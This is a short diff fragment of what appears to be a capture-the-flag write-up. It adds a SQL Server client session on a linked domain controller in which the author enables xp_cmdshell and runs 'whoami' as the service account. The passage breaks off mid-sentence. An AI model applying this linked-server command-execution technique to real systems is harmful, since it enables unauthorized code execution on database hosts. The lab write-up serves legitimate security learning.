@@ -328,5 +328,15 @@ SQL >[dc02.darkzero.ext] (dc01_sql_svc  dbo@master)>
 Ill switch to the remote server
 
 ```python
-
+SQL >[dc02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
+INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL >[dc02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
+output                 
+--------------------   
+darkzero-ext\svc_sql   
+NULL                   
+SQL >[dc02.darkzero.ext] (dc01_sql_svc  dbo@master)>
 ```
+
+Since i am a sysadmin on t
